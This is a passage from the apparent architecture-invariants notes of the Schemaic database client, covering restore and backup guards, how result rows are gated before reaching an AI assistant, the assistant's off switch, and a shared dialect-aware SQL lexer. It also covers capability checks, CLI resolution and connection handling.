  `read_only_of` **again**, as the destructive-launch rule asks of a guard behind a confirm — the
  flag can move from the status bar while the dialog and the question stood open.
  **That question names a database the file can override, so a script is read before it is
  asked.** `mysql --execute=source f -- db` and `psql -d db -f f` only choose where the script
  *starts*: the `USE shop` a `mysqldump --databases` dump carries — as do most third-party "export
  database" tools — or the `\connect shop` of a `pg_dump -C` script moved every statement after it
  into `shop` under a question that named `shop_copy`. Seen on MariaDB 10.11, and on PostgreSQL 16,
  where a `pg_dump -C` script restored "into" a copy created and wrote the original and left the
  copy untouched. So where the restore runs a script (`launch::restore_runs_a_script`) `restore_db`
  reads the **whole** file on `handle.spawn_blocking` (`script::database_switches`) and refuses in
  the panel, nothing run and no question asked, when a line names another database or one it
  cannot read (`script::restore_refusal`, worded by the app's `restore_refusal_text`); a file it
  cannot read, or one with no terminator, is
  refused the same way. **What this does not cover**: the client re-reads the file at the yes, so
  one replaced between the scan and the run is not re-checked — the question the script runner's
  `FileStamp` answers (`core/script.rs`), left open here.
  A backup is offered on a read-only connection where it is a file on this machine, as Export is:
  `pg_dump` and `mysqldump` read the server and write a local file, and SQLite's `VACUUM INTO`
  writes nothing to its source. **SQL Server's is not**: its `BACKUP DATABASE` is the server's own
  write — a file in its folder, replaced by `INIT`, and history rows in `msdb` — so where
  `launch::backup_writes_server` answers yes the entry is dimmed on a read-only connection and
  `backup_db` refuses at the launch as well, on `read_only_of` read live, the dimming not being the
  guard.
- **A row reaches the model only where `AiData` says it may, and the level is the connection's.**
  Every path that can put a cell value in a prompt — `run_query`, the `explain` tool (whose MySQL
  plan says whether a key exists, `cli/mcp.rs`'s entry), `describe_table`'s samples, the
  grid's attach-to-chat, AI Summary, AI Fill, AI Seed — is gated on
  `connection::AiData::{may_query, may_attach}`, resolved from **the connection the data came
  from** — `grid::ai_data_of` keys on `GridState::conn_at_load`, the id snapshotted when the rows
  arrived, and not on the tab's live `conn_id`. It read the live one until this was the last consumer
  still doing so, which was true only in the narrow sense of not reading the *globally* active
  connection: a tab can be rebound while its result stays on screen, so rows fetched on a
  schema-only connection became attachable the moment the tab was pointed somewhere more permissive,
  with nothing refetched. The policy for rows already in hand belongs to the server they came from,
  which is the argument the export scope, the blob re-read and `set_format` already make. **The
  connection *list* is still read live, and that half is deliberate**: locking a connection down has
  to take effect on a grid already on screen. What is fixed at load is which connection is looked
  up, not what that connection currently allows. The source gate is
  `the_assistants_data_level_is_the_one_the_rows_were_loaded_under` — a source gate because the
  decision is one line inside a view with no pure half: the lookup is right either way, and which id
  performs it is the whole of the bug. Don't add a path
  that samples, quotes or forwards result values without asking, and don't answer the question
  from a new flag: three unrelated toggles is precisely how a user comes to believe they are
  protected while a fourth path ships samples anyway — which is the state this replaced, where the
  AI panel's global "run queries" switch left `describe_table`'s five sample rows, the cell
  summary's column sample and Seed Table's bottom sample all flowing regardless. Gate at the
  action as well as at the menu: a menu built a moment before the connection was locked down is
  still on screen. The default (`OnRequest`) grants **no** automatic access — rows go only where
  the user attached them, so the gesture is the consent and there is no setting to forget.
  **`schemaic mcp` asks `may_query` too**, of the saved connection it serves
  (`mcp::Endpoint::standalone`): an outside client has no attach gesture, so `OnRequest` sends it
  no rows, and a level never chosen reads as that default rather than as the app's startup
  migration, whose legacy flag the CLI cannot see. And
  what is sent is kept honest at both ends: `result_shape` states out loud that no rows were sent,
  and `result_attachment` states the cap it applied.
  **Which of the two a path asks is itself a decision, and two paths had it wrong the same way.**
  The Fill/Seed sample and the engine's error text are `may_query`'s — `Full` alone — because both
  are values the *user did not hand over*, and `may_attach` is true at `OnRequest`, the default,
  whose consent line reads *"Rows you attach from a result leave this machine with that question"*.
  `AiData::may_query`'s and `may_attach`'s own docs now say which owns the sample, so the two cannot
  be read as answering the same question. The conversation **replay** is the other way about: it is
  prose the assistant wrote, which at `Full` can quote rows outright, so `ai::render_history`
  withholds it below `may_attach` — and withholds a turn produced by *another* harness whatever the
  level, since a vendor switch is not a gesture that any data should cross. **Gate inside the
  builder, not at the call site**, wherever the builder is pure: `seed::build_fill_prompt` and
  `build_seed_prompt` take the `AiData` and drop the sample themselves, so a third caller cannot
  forget, and the app declines to *fetch* it as well — a `SELECT * … LIMIT 20` the user never ran is
  a read of their data whether or not it is sent.
  **This gate covers what reaches the model, not what the model may then do with it** — that half is
  the spawned CLI session's tool set, and it was open. Measured against the shipped CLI, the
  `claude` child had nineteen built-in tools nobody had allow-listed, `Artifact` (which publishes a
  page to the web) and `SendMessage`/`PushNotification`/`RemoteTrigger` among them, so rows the user
  had deliberately attached under this gate were one tool call away from leaving anyway — and tools
  from that set were measured *executing inside a turn without raising a permission request at all*,
  so nothing would have stood between the attachment and the send.
  `schemaic_ai::build_session_args` and `inline_args` close that with `--tools ""` on a `claude`
  whose `--help` advertises the flag, and fall back to the twenty-nine-name denylist on one that
  does not rather than dying on an unknown option — see `schemaic-ai`, which is also where the
  reason the denylist could not do it on its own is written down. The other five harnesses close it
  by their own mechanism rather than by that flag, on the session path through `harness::turn_args`
  and on the one-shot path through `harness::inline_argv`, and how far each gets is `Constraint`.
- **An assistant that is off sends nothing and starts no agent process — refused at the action, not
  only hidden.** Off (`AiUi::enabled` false: *Disabled* in the *Agent CLI* dropdown, a new install's
  default, and what an unrecognised persisted key loads as) is checked by the five app actions every
  AI path goes through. `ai_send` returns before anything else, and with it go the grid's AI
  summary, the plan modal's and the palette's Ask AI and the schema tree's AI explain;
  `inline_ai_run` (Ctrl+K) answers `InlineAiState::Failed(ai_off_note())`; `ai_fill` and `ai_seed`
  answer `Failed` with the same note. **`ai_regenerate` refuses on its own, before it touches the
  transcript** (on `ai_busy || !ai_enabled`): it used to lean on `ai_send`'s guard, but it cuts the
  last question and its answer *first* and then hands the question on — so off, the turn was
  deleted with nothing sent, and the next persisted turn made the loss permanent
  (`regenerate_refuses_while_off_before_it_truncates_the_transcript`). The entry points are
  **absent, not greyed**, which was the
  user's call — the editor's right-click Ask AI/Explain/Optimise/AI fix and their separator, the
  error bar's and the error modal's Explain and AI fix, the schema tree's *AI explain*, the
  palette's *Ask AI*, the plan modal's button, the grid's sparkle and every `grid::ai_offered`
  entry, and the last reply's Regenerate icon in `ai_panel::assistant_footer` — hidden by a style
  on `enabled` rather than a rebuild, since the bubble's container is keyed on the message; Ctrl+K
  is consumed and opens nothing, so it cannot fall through to an editor binding. But
  **hiding is the courtesy, not the guard**, for the write guard's reason: a control the hiding
  missed, or a menu built a moment before the switch, must still send nothing. **Switching off ends
  what is running**, at the pick rather than when the settings page goes away: an effect on `ai_enabled` going
  false drops the live session, which kills its CLI, aborts an in-flight inline task, whose child is
  `kill_on_drop`, resets a Busy inline state, and settles a streaming turn with `mark_stopped`, since
  the gear is live mid-turn. **The grid's AI fills and seeds stop with it** — before, they ran on
  past the switch, fetching their sample, starting the CLI and staging the answer after the user
  had said no. Each is tracked in the `GridAiJobs` slot (its `JoinHandle`, and the grid's `done`
  wrapped in a `OnceReply`), and the effect empties it through `stop_grid_ai_jobs`: each task is
  aborted, which reaps its CLI by the same `kill_on_drop`, and each grid answered
  `Failed(ai_off_note())`, so its busy pulse clears and a seed's skeleton rows roll back. **The
  `OnceReply` is load-bearing**: the grid's `done` is not idempotent (a second `Value` stages
  twice), and a task can finish and queue its result just as *Disabled* is picked — that result
  then finds the reply spent, so nothing stages after the switch. The slot is taken out of its
  `RefCell` before any reply runs, so a grid callback can never find it borrowed
  (`switching_off_stops_the_grid_fills_and_seeds_under_way`, with `GridAiJobs` and `OnceReply`
  unit-tested beside it). **"No process" includes the probe**: `warm_probe_cache`'s effect
  returns early while off, because the probe is a spawn and it runs at every launch (`agent_cli.rs`).
  **The Antigravity, OpenCode, Copilot and Cursor sweeps run regardless**, and that is not a leak in
  the rule: they withdraw what an earlier session granted — an `agy` registration and its standing
  tool rules, Schemaic's own per-instance homes, what Cursor kept in `~/.cursor` — and ask no model
  anything, and an assistant switched off after a crash is exactly the case whose leftovers should
  not stand. The one of them that starts a process, `agy mcp remove`, does so only on a crashed
  session's claim (`antigravity::sweep_plan`), so an ordinary launch with the assistant off starts
  no agent CLI — it used to run at every launch wherever `agy` was found. What this does **not**
  have is a test that reaches the guards: all four are closures in `main.rs`, and the pinned halves
  are the pure ones, `Agent::of`, `Agent::apply` and `ai_panel::input_state_of`.
- **One SQL boundary lexer.** Any code scanning SQL for string / `-- ` / `#` / `/* */` / backtick /
  `$tag$` boundaries MUST build on `schemaic_core::sql::skip_noncode` (statement split, WHERE guard, AI
  read-only gate, `init_sql::check`, `intel`'s tokenizer, `sql_highlight`, `sqlfmt`, and `users::redact_secrets`, where
  a span ended early leaves the tail of a password hash on screen). Never hand-roll a second
  scanner — five drifting copies was the original bug. **It binds outside `schemaic-core` too**:
  `intel::code_names` is `pub` so a *backend* can ask "does this SQL name this identifier, in code"
  through the same lexer rather than reaching for a `contains` — `db::sqlite`'s introspection asks
  it of every trigger in the database to fill `TableInfo::referring_ddl`.
  **And it binds to a single byte as much as to a span.** `intel::scan_clauses` had to know whether
  the projection contained a `*` — the tokenizer drops the byte — and asked `str::contains('*')`
  over the SELECT-clause span: no boundary awareness and no dialect. So a star inside a string or a
  comment counted as a projection, and `SELECT 'a*b', ` (an *empty* slot after the comma) offered
  `FROM`, while `SELECT -- *` and `SELECT /* * */` offered `FROM` and suppressed `DISTINCT` with
  nothing projected at all. It goes through `intel::code_mask` now — this module's own primitive for
  the rule, and dialect-aware, which a `contains` cannot be — pinned by
  `a_star_in_a_string_or_comment_is_not_a_projection`, which also asserts a real star still counts.
  **It's dialect-aware:** `skip_noncode`/
  `skip_comment` (and the `sql.rs` helpers built on them — `statement_bounds`/`ranges`/`range`/
  `first_statement`, `statement_bounds_open` (the resumable form the script splitter feeds),
  `executable_statements`/`executable_spans`/`executable_range`/`executable_at`,
  `read_only_reason`, `has_top_level_where`/`unsafe_reason`/`first_unsafe`/`contains_write`) take a
  `SqlDialect`, so pass the connection's dialect (Postgres `#` is an operator not a comment, `$tag$…$tag$`
  is a string, `"…"` an identifier, `\`-escapes only in MySQL / PG `E'…'`; SQLite takes `"x"`,
  `` `x` `` *and* `[x]` as identifiers and has no backslash escape at all). **It is dialect-aware
  about statement *boundaries* too, not only tokens:** on SQLite a `;` inside a `CREATE TRIGGER`'s
  `BEGIN … END` block does not end the statement. SQLite has no `DELIMITER` directive to hide those
  semicolons behind, so without this `statement_bounds` cut a trigger in half and Run Everything
  sent `… BEGIN UPDATE log SET n = 1;` and `END;` as two statements. A private `TriggerScan` state
  machine counts block openers (`BEGIN`, `CASE`) against `END`, so a `CASE … END` inside the body
  can't end it early — the same thing `sqlite3_complete()` does for SQLite's own shell. MySQL and
  PostgreSQL boundaries are deliberately untouched: MySQL's trigger bodies go behind `DELIMITER`.
  **That directive is taken at the start of a segment whose bytes so far are whitespace *and
  comments*** (`only_comments_between`, over `skip_noncode`), as the `mysql` client reads a script,
  and the comments ahead of it are cut off into a comment-only segment of their own, which
  `is_runnable_segment` drops. It was whitespace alone, and the dump opens its trailing sections
  with a `-- Routines and events` / `-- Triggers` line right above the first `DELIMITER $$`: the
  comment, the directive and the body's first statement went to the server as one, so every MySQL
  dump holding a routine or a compound trigger stopped at ERROR 1064 through Run file, its tables
  already replaced. A string or a quoted name ahead of the word is code, so `SELECT delimiter`
  stays data. **What Run Everything sends did change, on purpose**, and that is the other half of this
  invariant: a *range* keeps its terminator, because the editor selects and highlights with it, and
  a server must never see the client's `DELIMITER` token — `END$$` lexes as one identifier on MySQL
  and failed every dump carrying a trigger. So the three paths that **execute** go through
  `executable_range` rather than slicing the ranges: `executable_statements` (Run Everything),
  `core::script`'s streaming splitter (the script runner), and `executable_at` (Run Current, which
  was left behind by the first two and shipped a release sending `…END$$`). Anything that
  *executes* uses one of those three; anything that selects, highlights or measures keeps
  `statement_range` — save Run Current's own outline, which is `run_current_range`, the range
  `executable_at` sends (shorter inside a T-SQL batch scope, see `BatchScope` above, and at a blank
  line in the tail no `;` ends, see `blank_line_cuts`). Where those
  statements *sit* is `executable_spans` (and `selection_spans`, offset into the buffer rather than
  the selection), and `executable_statements`/`selection_statements` are those spans sliced — one
  computation, so the ranges a failed run is squiggled in (`intel::run_error_diagnostic`) cannot
  drift from the text that was sent (`the_spans_are_where_the_executable_statements_sit`,
  `a_selections_spans_are_in_the_buffer_not_the_selection`). The other half of that
  is `ddl::client_script` — what `ChangeSet::editor_script` and a routine's `Generate DDL` both go
  through — which asks `== MySql` before reaching for `DELIMITER $$` so a SQLite plan is never
  handed a directive the engine has never heard of, and **terminates every statement** on the way
  past. That second rule reads as a no-op because nearly everything already ends in its own `;`;
  the exception is a MySQL routine's `CREATE`, which deliberately carries none (the apply path
  sends each step whole) and whose body is full of `;` — so two of them joined for a reader ran
  together, and one pasted into a query tab was cut mid-body. It is one function rather than two
  because that is exactly the divergence that produced the bug: `editor_script` knew the rule and
  the schema tree's copy path didn't. **Ask the capability,
  never the engine** — the rules are predicates on `SqlDialect` (see `sql.rs` above), because
  `dialect == Postgres` / `!= MySql` compiles cleanly while silently sorting a third engine onto
  whichever side it falls, and two of the answers it got wrong for SQLite could hide a `WHERE`
  from the guard. It is the same rule away from the lexer: the table designer's form asked
  `!= Postgres` in three places and thereby offered a SQLite table a storage engine, a table
  collation, comments and `ON UPDATE`, none of which that engine has — each now asks for the
  capability. **Deriving the dialect is the same question**: `Engine::dialect()` is the one
  exhaustive answer, and the hand-written `if engine == Postgres { Postgres } else { MySql }` that
  stood in for it in `app::mcp` and `app::main` is exactly how SQLite came to be lexed by MySQL's
  rules on the AI path (see `cli/mcp.rs`, where that server lives now). The **terminal's DB-client button** was the last
  of that shape to fall (`open_db_cli`): `if is_postgres { psql } else { mysql }` handed a SQLite
  connection to the MySQL client along with the inert `127.0.0.1:3306` a *file* connection carries,
  so the button either reported no client or opened a session against an unrelated local server and
  badged it with this connection's name. It is a `match` on `Engine` now, with `sqlite_shell` as the
  third arm — **native `PATH` only, no WSL fallback**, because a host and port mean the same thing on
  both sides of that boundary and a *path* does not: `sqlite3 'C:\data\app.db'` inside WSL doesn't
  fail, it creates an empty database under that literal name. The same arm is why `wrap_launcher`
  takes its environment as a `Vec` and treats an empty one as meaningful — a client with no
  credential sets no variable and names none in `WSLENV`, which is not the same as passing an empty
  password. (It was `Option<(var, password)>` until the TLS settings had to travel the same road;
  see `core::launch`.) `mssql_shell` is the fourth arm, and takes the WSL fallback — a host and a
  port again.
  **The backup and restore tools split the same way, on their *file* rather than their database.**
  `native_tool` resolves `pg_dump`, `pg_restore`/`psql`, `mariadb-dump`/`mysqldump` and
  `mariadb`/`mysql` — MariaDB's names first, for `launch::MYSQL_DUMP_TOOLS`' reason — through
  `resolve_native_cli` only, because the file is a path this machine's
  dialog gave and a tool inside WSL would read it as somewhere else; like `resolve_cli` it skips a
  refused candidate and keeps the first refusal as the answer of last resort. `mssql_backup_shell`
  is `mssql_shell` with `-Q <launch::mssql_backup_sql>` appended, WSL fallback included, since the
  server writes its own file and no local path reaches the tool. The passwords travel as *Open in
  CLI*'s do — `PGPASSWORD` with `psql_cli_tls_env`, `MYSQL_PWD`, `SQLCMDPASSWORD` through
  `mssql_shell`. **Each of the four local-file builders asks the tunnel refusal itself**, through
  `tool_tunnel_check` (`tunnelled_verify_blocker` for a tunnelled connection), so no launch path
  compiles without it — `both_cli_builders_refuse_a_tunnelled_verifying_connection_themselves` reads
  them beside the three client builders. **`tool_tunnel_check` carries the cloud IAM refusal
  too** (`AuthMode::external_client_refusal` of `effective_auth`), and `mysql_shell_config` and
  `psql_shell_config` ask it first, so neither a client nor a backup tool is launched for a
  connection whose sign-in is a token the app fetched and the tool is never handed
  (`a_cloud_iam_connection_opens_no_external_client` pins all three). Two helpers sit after `open_db_cli` in `main.rs`: `reach_for_cli` is its tunnel
  step — `tunnelled_verify_blocker` first, then the tunnel's local port or its refusal — as a second
  copy rather than a shared one, `open_db_cli` still carrying its own; and `run_in_panel` reveals the
  terminal and installs the config or a `message_shell` of the refusal, never with an engine badge.
  `backup_db` asks no dialog on SQL Server (the bare `backup_file_name` goes straight to `sqlcmd`)
  and a save dialog elsewhere, defaulting to `<db>_<stamp>.dump`, `.sql` or `.db`; SQLite's is the
  one backup that runs in-process, `Db::backup_to_file` off the UI thread, its "Backed up to …" or
  "The backup failed: …" shown as a message in the same panel. `restore_db` reads a script before
  its confirm (the write-guard invariant's restore paragraph) and logs the launch through
  `log_write` once the client's argv is built (`launch::restore_log_entry`).
  **The search in front of that `match` had a `?` where it wanted a `continue`.** `resolve_cli` takes
  a list of candidate names and `direct_spawn_verdict` refuses a `.cmd`/`.bat` image, which `cmd.exe`
  runs and which does not know what the `--` terminator in front of a server-supplied database name
  means — and the `?` on that verdict propagated straight out of the candidate loop. So a Windows box
  with an npm/scoop-style `mysql.cmd` earlier on `PATH` than a real client never tried `mariadb`,
  never reached the WSL arm, and was told to point Settings at the real executable — a setting that
  does not exist on this path, the only DB-CLI resolution being this probe, so the feature was simply
  gone on a machine that had a safe client installed. A refused candidate is skipped now, the loop's
  whole shape being that the refusal is about *this candidate*, and the message is kept as the answer
  of last resort so a box whose **only** client is a shim still gets that specific line rather than
  the generic one. `resolve_cli_with(progs, resolve)` takes the resolver, so the search is testable
  without a `PATH`. **The verdict is about the file `schemaic_term::shell::which` resolved, so that
  is the file the terminal starts** (security review S25): `Terminal::spawn` used to hand
  portable-pty the bare name, which searched `PATH` again on its own, relative entries included,
  and could start a different file from the one judged. It spawns `which`'s absolute path now, and
  `which` itself skips a relative or empty entry — `schemaic-term`'s entry.
  **What the search reaches is a value, not a sentence.** `resolve_cli`, `resolve_cli_with` and
  `resolve_native_cli` answer `Err(Unreached::Absent)` or `Err(Unreached::Refused(why))` — `why`
  a `launch::Refusal`, which `said` words through `refusal_text` — and each
  caller makes the panel's line with `Unreached::said`, naming its own client from the catalogue
  (`cli-no-client` and its siblings); `native_tool` takes that line as its `none` closure. The
  generic case was a `const NO_CLIENT` sentence the callers compared the error against, by text, to
  swap in their own client's name — a comparison that stops matching the moment the sentence is
  translated, with nothing to say so: *Nothing decides behaviour by an English label* (under *UI
  conventions*), met on an error rather than a label.
  **A *constant* standing in for a capability is the same failure with no comparison left to grep
  for**, and three of that shape fell together. `ddl::normalize_type`'s `dialect == Postgres` became
  the private, exhaustive `TypeAliasing` (see `ddl.rs`), which is what stopped SQLite being
  canonicalised by MySQL's alias table. `ddl_preview::exit_cancellable` takes an `Option` — of
  the `DdlPreview` now, since the plan answers too (`DdlPreview::whole`, under `Db::run_ddl`) —
  where it had `.unwrap_or(SqlDialect::MySql)`: with no preview open there is
  no engine to ask, and the guard was correct only by coincidence, `ddl_rolls_back_as_a_whole(MySql)`
  happening to be `false` — MySQL 8's atomic DDL is exactly the refinement that predicate exists to
  absorb, and the day it lands the absent case would have begun reporting *cancellable* with nothing
  in the diff naming that modal. And `emit_mysql`'s table-comment literal takes the function's own
  `d` like every other literal in the statement, since it is reached through `emit()`'s `_` arm and
  a fourth variant of the MySQL family would otherwise have got MySQL's escaping for the comment
  while its neighbours got their own. `SqlDialect::backtick_ident` is the other half of the tidy:
  `pub(crate)` so `core::pairs` can ask it at its two sites rather than hand-spelling
  `!= SqlDialect::Postgres`, which agreed for all three engines today and could survive neither a
  fourth nor a change at the definition, since it would move one and not the other.
  **Two of the newest members answer with an exhaustive `match` rather than being computed**, and
  they are the shape to copy when there is no statement to probe. `ddl::trigger_names_are_schema_scoped`
  is a fact about each engine's *namespace* — whether a trigger name is unique per schema or per
  table — measured on all four servers rather than derived from `supports_change`, and
  `intel::builtin_catalog` is a fact about which builtin catalog, if any, this app holds for an
  engine. Neither has a capability to be computed from, so the compiler's exhaustiveness is
  the only thing that will make a fourth engine answer instead of inheriting whichever side a `==`
  left open — which is exactly what happened to the typo checker on PostgreSQL and SQLite.
  `builtin_catalog` also shows the shape one step further on: it **returns the catalog**
  (`Option<&'static [SqlFunction]>`) rather than sitting beside a bool, and the
  `builtin_functions_are_authoritative` that did sit beside it was deleted — "is this app's list
  authoritative here" and "which list" are one question, and answering it twice is two arms to keep
  in step instead of one. The typo checker, `rank::rank` (through `intel::offered_builtins`),
  `signature_help` and `builtin_summary` all ask it now, which is that argument at the other end:
  four surfaces, one map, so a fourth engine is forgotten in one place rather than four — and it
  was forgotten in three, for as long as the popup and then the signature bar named `FUNCTIONS`
  themselves. **The cache in front of it is
  the same shape for the same reason**: `intel::catalog_index` is four `OnceLock`s, one per
  `SqlDialect` arm, rather than one map keyed by the dialect, so a fifth engine is a compiler error
  there too rather than a cache nothing ever fills.
  **`SqlDialect` was one level too coarse for one of those surfaces, and in the opposite direction
  to the usual failure**: the usual one is a model that cannot say *unknown*, this one could not say
  *which of two servers*. MySQL and MariaDB share a dialect — rightly, for parsing, quoting and the
  shape of a completion — and differ on which builtin names exist, so the one `intel::FUNCTIONS`
  offered a MySQL 8 tab forty-nine functions it cannot call. The answer is not a fourth
  `SqlDialect` arm but the `ServerFlavour` the schema already carried, passed alongside:
  `is_offered_builtin(dialect, flavour, name)`, with the flavour read only on the MySQL arm. It is
  the first reader of that enum outside the DDL and comparison paths (`ddl::Target`,
  `compare::occupied_names`), and its `Unknown` deliberately goes the *other* way from
  `occupied_names`' — offering everything rather than withholding — because what an uncertain read
  costs here is one row in a popup, not a table's constraints.
  **The rule has a gate now, and it is a ratchet rather than a ban.** `ui::engine_comparison_gate`
  scans both view crates' production source (`source_gate::crate_sources`, so `schemaic-app` is in
  it too) for `SqlDialect::` and holds each file to a **per-file budget with a written reason**,
  because several admitted sites are per-engine *syntax shape* — a trigger-body template,
  `INSTEAD OF` timing, a view's `ALGORITHM=`, whether an account name has a host part — that no
  capability predicate covers, and what has to be stopped is a new one appearing without anyone
  deciding it should. It was unenforced for as long as the view crates' count went from zero to two
  dozen unremarked. Two spellings are deliberately **not** counted: an exhaustive `match` arm, since
  the compiler already refuses a fourth variant there and the swallowed-engine hazard cannot arise,
  and `SqlDialect::from_db_type(`, which is the *input* to a capability question and buried the
  sites this is about under the ones that are simply correct. The counts are exact in both directions,
  so paying one off is a deliberate edit here as well, which is the only way the number goes down.
  The reasons are the record: the gate was written with an empty allowlist, watched reporting all 29
  sites, each then admitted with its reason, and verified by a planted comparison — and three are
  labelled **not clean** rather than approved, because a gate that launders debt into approval is
  worse than none: `overlays.rs`'s `!= MySql` for whether a *view* may take a trigger (asked again
  in `trigger_editor.rs`' own spelling, which was defence in depth and divergence the moment one
  was edited — paid off since as `ddl::supports_view_triggers`, which both ask, taking
  `overlays.rs` and `routine_editor.rs` off the list and `trigger_editor.rs` 6 → 1), and
  `table_designer.rs`'s column-comment and `ON UPDATE` availability, which want
  `supports_column_comments` and `supports_on_update_current_timestamp` — the first paid off since
  as `ddl::supports_comments`, asked of the table's comment field too, when SQL Server's Create
  table needed both hidden; `ON UPDATE` as `ddl::supports_column_on_update`, with the storage row
  and the check's *Enforced* toggle beside it, taking the file 4 → 1; its last, the index form's
  PostgreSQL-only *Method*-and-predicate block, split into `ddl::supports_index_method` and
  `supports_partial_index` once SQLite read a partial index's predicate back, taking it off the
  list. What the view crates still have admitted is one site each in `account_editor.rs`,
  `lib.rs`, `trigger_editor.rs` and `schemaic-app/ai.rs`. Giving the predicates a
  named home outside `ddl.rs` — which is legitimately per-dialect throughout, and long enough that
  a view author looking for one does not find it — is the half the gate does not do, and is open.
  `export::qualified_table` was the same sitting's other half: its per-engine `match` spells the
  SQLite arm out rather than taking a `_`, since a wildcard sorts a fourth engine onto the
  qualifying side silently and — unlike a `== Postgres` — leaves no comparison for this census to
  grep for, while the compiler, which flags an inexhaustive match, says nothing about a covered one.
  **No exceptions** —
  `intel::tokenize_range` (the mid-edit byte-position *fallback*) is dialect-aware too, and so are the
  `intel` entry points that reach it (`clause_context`/`clause_continuation`/`join_targets`/
  `expand_star`/`signature_help` all take a `SqlDialect`). It additionally lifts a **quoted identifier**
  out as a word — `` `t` `` on MySQL, `"t"` on PG, any of the three on SQLite — since that's the form
  Schemaic itself generates and the fallback is exactly what runs mid-`WHERE`; `intel::ident_quote`
  answers per *byte* rather than holding one quote char, because SQLite's `[` doesn't even close
  with the byte it opened with.
  **That makes `ident_quote` a second per-dialect quote table, and the two are now checked against
  each other.** `sql::ident_at`/`quoted_ident` deliberately does not go through `skip_noncode` —
  which bytes quote a *name* is `ident_quote`'s question, precisely because `]` does not close with
  the byte it opened with — so it stands beside `SqlDialect::backtick_ident` /
  `double_quote_is_ident` / `bracket_ident`: two tables, one fact, three dialects, six independent
  editing sites, and nothing asserted they agreed. A fourth dialect, or a change to one engine's
  accepted quoting, means editing both, and editing only one fails silently **in the direction that
  matters** — an `ident_quote` answering `None` for a spelling `skip_noncode` reads as an identifier
  makes the tokenizer treat a quoted name as opaque non-code, which is the shipped bug that
  function's own doc records, a completion popup going blank on a name the user quoted.
  `intel::the_two_quote_tables_agree_for_every_dialect_and_byte` pins both directions, the negative
  half included, so a table that said yes to everything would fail too. The two are **not** merged
  and should not be: the `doubled` flag and the asymmetric `]` close belong to `ident_quote`. This
  turns them into one checked fact instead.
- **Structure-aware SQL analysis goes through `schemaic_core::intel` (real per-dialect AST), not new
  hand-rolled scanners.** Scope resolution, completion context, and diagnostics build on the
  `sqlparser` AST (with a `skip_noncode` fallback for mid-edit); the **DB stays the semantic
  authority** (don't hand-roll type checking / name resolution — that's a planned PREPARE/EXPLAIN
  tier). New dialects are a `SqlDialect` arm, not a parallel analyzer. Use the AST for classification
  and `skip_noncode` byte offsets for positions by default; the exception is the per-scope column
  resolver (`intel::colres`), which relies on sqlparser 0.62's per-identifier spans (accurate — verified)
  because per-occurrence positions can't come from the lexer. Name resolution here is deliberately
  conservative: an unenumerable source (unloaded/unknown table, `SELECT *` derived/CTE) is *open* so
  uncertainty never yields a false positive; the DB stays the authority for type checking.
  **Read AST identifiers unquoted** — `Ident`/`ObjectNamePart`'s `Display` re-adds the quoting, so a
  `` `t` ``/`"t"` name comes back quote-wrapped and never matches the catalog (which is keyed on bare
  names). Go through `intel::object_name_parts`, or `Ident::value` for a lone identifier.
  **One refusal gate is a token scan on purpose**: `sql::unlisted_call`, PostgreSQL's function
  allowlist in the read-only gate, asks about anything *spelled* as a call, where an AST visitor
  would ask only about the node shapes it knows and fail open on the rest — `core::sql`'s entry
  gives the reason in full. It is a refusal, never analysis a feature reads.
  **The second stated exception is a reader, not a refusal**: `ddl::tsql_trigger_parts`, a token
  walk (`TsqlCursor`) over `skip_noncode` that reads a SQL Server trigger's stored header into the
  options a `CREATE OR ALTER` must restate. sqlparser 0.62's T-SQL `CREATE TRIGGER` knows neither
  the `WITH` options nor `NOT FOR REPLICATION` and parses the body as statements, so the AST answers
  `None` for the very triggers the editor has to read — `core::ddl`'s entry has the rest. **Its
  siblings `ddl::tsql_routine_parts` and `ddl::tsql_view_parts` are the same exception, not a
  third and a fourth**: the same cursor reading a procedure's or function's header, and a view's,
  for the same reason — the T-SQL routine grammar carries no `WITH` options, and a body is text an
  AST would re-print rather than keep. **The view walk was an unstated reader until it moved
  here**: a byte scan in `db::mssql` over `sql::is_word_byte`, which read `v$as` as `v` and the
  header's `AS` and, on a header it could not find, guessed. All three are held
  to the grammar's header and nothing more, and anything outside that shape answers `None`, which
  keeps the object listed and droppable but never rebuilt — so any may be widened only for a
  clause the model then restates, since a word it merely skipped would be dropped by the rebuild.
- **One connection per operation — except a Manual-mode tab, and a running script.** Every `Db` method opens a fresh
  connection, runs, and disconnects; that statelessness is why a dropped connection is never a
  problem. The *first* exception is manual-transaction mode: a tab set to `TxMode::Manual` pins one
  connection (`schemaic_db::Session`, one `Conn`/`Client` behind a `tokio::Mutex`) for the life of
  its transaction, held in the app's `sessions` map (tab id → `Arc<Session>`). Only the tab's own
  work routes there — run, Run Everything, grid writes, and the post-write re-fetch (which *must*,
  since no other connection can see uncommitted rows). Read-only side channels (schema
  introspection, live-validate `PREPARE`, EXPLAIN, Live Monitor, AI/MCP) stay on fresh connections so
  a long transaction can't block them. Don't add a second connection-caching path; extend `Session`.
  **And a cancel on that connection may not be a bare `tokio::select!`.** Dropping a `mysql_async`
  future leaves the connection's result stream desynchronised, and every reply after it belongs to
  the statement before — survivable everywhere else in the DB layer precisely *because* of this
  invariant, since the poisoned connection is disconnected on the way out, and not survivable here,
  where it is pinned for the life of a transaction. So a cancel on a connection that outlives the
  statement kills at the server and then **awaits** what it killed (`mysql::cancel_awaited`). All
  four of `Session`'s MySQL arms raced and dropped instead: a Stop in a Manual tab made the next
  `COMMIT` read the previous statement's reply, reported as success over **0 committed rows** on
  MySQL 8.4.11 and as failure over a row that *was* committed on MariaDB 10.11.14.
  `session::pg_cancel_gate` holds the shape for both engines — see `schemaic-db` for what each gate
  can and cannot see. The await is unbounded only behind a kill the server answered: one that went
  unanswered gives the statement a grace and then retires the connection (`Backend::Retired`)
  rather than read it again, since awaiting a server gone dark held the session's lock and queued
  the tab's Rollback behind it for ever (security review S22, under `Db::import_rows`).
  SQL Server's arm keeps the rule by the attention and its acknowledgement,
  and a connection that no longer answers its own requests after a Stop is not trusted but
  replaced, the tab told `ConnectionLost` (`Session::resync_after_stop`, under `mssql.rs`).
  **The second exception is `Db::run_script`**, and it is a genuine one rather than a long call:
  the connection is pinned for the length of the whole file. A script's statements are not
  independent. A dump opens with `SET FOREIGN_KEY_CHECKS = 0` (`dump::fk_guard_sql`), may carry its
  own `BEGIN` … `COMMIT`, and on MySQL switches the terminator around a routine — all *session*
  state, so a fresh connection per statement would apply the guard to a connection already gone and
  then fail the load on the first child row. It is not `Session`: that type's automatic `BEGIN` is
  Manual mode's semantics, and a script's transactions belong to the file. For the same reason it is
  **not `run_ddl`**, which on all three engines takes `&[String]` (the whole plan in memory) and
